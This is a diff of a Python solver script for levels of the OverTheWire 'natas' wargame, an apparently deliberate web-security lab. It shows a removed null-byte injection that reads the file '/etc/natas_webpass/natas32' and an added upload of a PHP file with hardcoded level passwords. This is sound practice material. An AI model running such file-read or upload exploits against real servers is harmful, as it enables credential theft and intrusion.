@@ -1,10 +1,10 @@
 import sys
 import requests as req
+import hashlib
 
-username = "natas31"
-password = "AMZF14yknOn9Uc57uKB02jnYuhplYka3"
+username = "natas33"
+password = "APwWDD3fRAf6226sgBOBaSptGwvXwQhG"
 url = "http://%s.natas.labs.overthewire.org/" % username
-url += "index.pl?/etc/natas_webpass/natas32\0"
 
 s = req.session()
 
@@ -16,13 +16,22 @@ def post(s, data):
 	r = s.post(url, auth=(username, password), data=data)
 	return r
 
-def upload(s, files, data):
+def upload(s, files, data=None):
+	if not data:
+		r = s.post(url, auth=(username, password), files=files)
+		return r
 	r = s.post(url, auth=(username, password), files=files, data=data)
 	return r
 
 if __name__ == "__main__":
-	data = {"file": "ARGV"}
-	files = {"file": open("test.txt", "rb")}
-	r = upload(s, files, data)
+	filename = "test.php"
+	data = {"filename": filename}
+	files = {"uploadedfile": open(filename, "rb")}
+	r = upload(s, files=files, data=data)
+	#r = get(s)
 	print(r.text)
 	print(r.request.body)
+
+	file_contents = "adeafbadbabec0dedabada55ba55d00d"
+	result = hashlib.md5(bytes(file_contents, "utf-8")).hexdigest()
+	print(result)
